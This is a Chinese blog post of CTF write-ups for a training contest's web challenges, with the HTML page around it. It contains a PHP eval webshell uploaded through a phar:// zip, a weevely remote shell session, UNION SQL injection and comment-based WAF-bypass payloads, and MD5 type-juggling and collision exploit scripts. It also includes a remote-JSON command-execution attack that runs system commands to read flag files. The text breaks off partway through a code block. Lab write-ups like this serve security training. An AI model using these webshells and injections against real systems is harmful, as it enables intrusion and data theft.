<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.0.0"><meta name="baidu-site-verification" content="CpUtq7PVXz"><meta name="google-site-verification" content="BDfwg8yARZd_uEasrK3RvZGmWmUg37NQSE3cumBTgMI"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="baidu-site-verification" content="64WFuMirLucMnUVd"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"7.4.2",exturl:!0,sidebar:{position:"left",display:"post",offset:12,onmobile:!1},copycode:{enable:!1,show_result:!1,style:null},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,algolia:{appID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},path:"search.xml",motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},translation:{copy_button:"Copy",copy_success:"Copied",copy_failure:"Copy failed"},sidebarPadding:40}</script><meta name="description" content="安恒训练赛常规操作http:&#x2F;&#x2F;114.55.36.69:8009&#x2F;index.php?url=uploadupload很明显的文件上传，查了下是php伪协议看到zip于是猜测是phar:&#x2F;&#x2F;伪协议读取。于是写个小马打包成zip文件传上去。例如我写的是south.php。然后压缩成south.zip，那么需要访问以下链接。"><meta name="keywords" content="web安全,练习"><meta property="og:type" content="article"><meta property="og:title" content="web安全训练"><meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;posts&#x2F;f605762&#x2F;index.html"><meta property="og:site_name" content="NoOne-hub"><meta property="og:description" content="安恒训练赛常规操作http:&#x2F;&#x2F;114.55.36.69:8009&#x2F;index.php?url=uploadupload很明显的文件上传，查了下是php伪协议看到zip于是猜测是phar:&#x2F;&#x2F;伪协议读取。于是写个小马打包成zip文件传上去。例如我写的是south.php。然后压缩成south.zip，那么需要访问以下链接。"><meta property="og:locale" content="zh-Hans"><meta property="og:updated_time" content="2019-11-10T08:45:17.987Z"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://noone-hub.github.io/posts/f605762/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,isPage:!1,isArchive:!1}</script><title>web安全训练 | NoOne-hub</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">NoOne-hub</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">A place that No One knw</h1></div><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i> About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i> Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> Archives</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="site-search"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Searching..." spellcheck="false" type="text" id="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"></div></div><div class="search-pop-overlay"></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div> <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115 130 115 142 142 250 250 250 0Z"></path><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4L133.7 101.6C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8Z" fill="currentColor" class="octo-body"></path></svg></span><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans"><link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/f605762/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/photo.jpg"><meta itemprop="name" content="NoOne"><meta itemprop="description" content="One people that no one know"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="NoOne-hub"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> web安全训练</h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span> <span class="post-meta-item-text">Edited on</span> <time title="Modified: 2019-11-10 16:45:17" itemprop="dateModified" datetime="2019-11-10T16:45:17+08:00">2019-11-10</time></span><span id="/posts/f605762/" class="post-meta-item leancloud_visitors" data-flag-title="web安全训练" title="Views"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span> <span class="post-meta-item-text">Valine:</span><a title="valine" href="/posts/f605762/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/posts/f605762/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="Symbols count in article"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">Symbols count in article:</span> <span>6.3k</span></span><span class="post-meta-item" title="Reading time"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">Reading time &asymp;</span> <span>6 mins.</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9dXBsb2Fk" title="http://114.55.36.69:8009/index.php?url=upload">http://114.55.36.69:8009/index.php?url=upload<i class="fa fa-external-link"></i></span></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a> <?php
    @eval($_POST['south']);
    ?><p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhhcjovL3VwbG9hZC8xM2Q5ODM4OGZiZjdhMDM5N2RlODdlZTM2NTgzMGRmOC56aXAvdGVzdA==" title="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test<i class="fa fa-external-link"></i></span><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p><p>weevely generate<password><path></path></password></p><p>weevely generate test ./test.php<br>生成小马</p><p>然后压缩<br>zip test.zip test.php</p><p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGFn" title="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag<i class="fa fa-external-link"></i></span></p><h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA0" title="http://114.55.36.69:8004">http://114.55.36.69:8004<i class="fa fa-external-link"></i></span></p><p>easy MD5 cracking</p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure><p>没有md5?应该是只有部分代码</p><p>脑补一下剩下的代码</p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p><p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMDMyMzQ5OQ==" title="https://zhuanlan.zhihu.com/p/30323499">https://zhuanlan.zhihu.com/p/30323499<i class="fa fa-external-link"></i></span></p><p>data1[]=1 &amp;&amp; data2[]=2</p><p>flag{401cf19d304e557349fecda18110c138}</p><h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEw" title="http://114.55.36.69:8010">http://114.55.36.69:8010<i class="fa fa-external-link"></i></span></p><p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p><p>burp</p><p>注入表名</p><p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()– &amp;number=5</p><p>注入得到列名</p><p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’– &amp;number=5</p><p>得到flag<br>word=1%’ union select 1,2,flag from admin– &amp;number=5</p><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDIy" title="http://114.55.36.69:8022">http://114.55.36.69:8022<i class="fa fa-external-link"></i></span></p><p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p><p>A.A[]=1</p><h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p><p>py读取二进制流在urlencode一下</p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>然后通过burp或者py都可以直接获得flag</p><p>这里用hackbar会变成二次url编码，然后会出问题</p><h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p><p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p><p>注释是c语言注释格式/* */ !和数字，这个数字不能太小</p><p>。。flag不对。。</p><h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEx" title="http://114.55.36.69:8011">http://114.55.36.69:8011<i class="fa fa-external-link"></i></span><br>简单js执行命令即可</p><h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p><p>1de3ce6607a0f95as1861c4bbb3687b8</p><h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，发觉可以命令执行</p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br><span class="line">&lt;p class=<span class="string">"code-caption"</span> data-lang=<span class="string">""</span> data-line_number=<span class="string">"frontend"</span> data-trim_indent=<span class="string">"backend"</span> data-label_position=<span class="string">"outer"</span> data-labels_left=<span class="string">"Code"</span> data-labels_right=<span class="string">":"</span> data-labels_copy=<span class="string">"Copy Code"</span>&gt;&lt;span class=<span class="string">"code-caption-label"</span>&gt;&lt;/span&gt;&lt;a class=<span class="string">"code-caption-copy"</span>&gt;Copy Code&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">部署在服务器上，默认以80端口，这样就不用index.php了</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$url</span> = array(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$url</span> = json_encode(<span 